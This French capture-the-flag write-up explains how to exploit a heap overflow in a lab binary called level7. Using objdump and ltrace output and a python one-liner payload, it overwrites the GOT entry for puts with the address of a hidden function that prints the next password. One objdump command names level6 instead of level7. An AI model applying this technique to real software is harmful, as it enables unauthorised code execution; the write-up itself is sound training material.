En analysant le code, on constate qu'afin de pouvoir lire notre prochain mot de passe, il faut pouvoir executer la fonction m.

On va d'abbord chercher plus de details sur m:

```shell
objdump -t ./level6 | grep m
```

--> On obtient la ligne `080484f4 g     F .text	0000002d              m`
m est donc bien une fonction (F), nous allons donc chercher a executer son adresse: 080484f4 (ou \xf4\x84\x04\x08 en Little Endian)

--> Nous allons utiliser le meme type de faille que celle utilise dans le level precedent. Nous allons remplacer l'appel de puts par l'appel de m. Pour cela, nous avons besoin de l'adresse de puts:

```shell
objdump -R ./level7 | grep puts
```

--> On obtient la ligne `08049928 R_386_JUMP_SLOT   puts`
L'adresse de puts est donc 08049928 ou en Little Endian: \x28\x99\x04\x08

Enfin, nous avons besoin de savoir a partir de quel padding notre programme segfault, afin de remplacer l'appel situe a cet position par notre appel "malveillant".

```shell
ltrace ./level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa a
__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                             = 0x0804a008
malloc(8)                                                                             = 0x0804a018
malloc(8)                                                                             = 0x0804a028
malloc(8)                                                                             = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)                             = 0x0804a018
strcpy(0x61616161, "a" <unfinished ...>
```

--> Il est necessaire d'avoir 21 "a" dans notre premier argument afin de faire segfault le programme. Notre padding va donc etre de 20.

## Nous avons donc :

1. L'adresse de puts : \x28\x99\x04\x08
2. La taille du padding: 20
3. L'adresse de m : \xf4\x84\x04\x08


On va donc remplacer l'appel de puts par l'appel de notre fonction m :

```shell
./level7 "$(python -c 'print "A"*20 + "\x28\x99\x04\x08"')" "$(python -c 'print "\xf4\x84\x04\x08"')"
```

--> Nous avons notre mot de passe pour le level 8 !
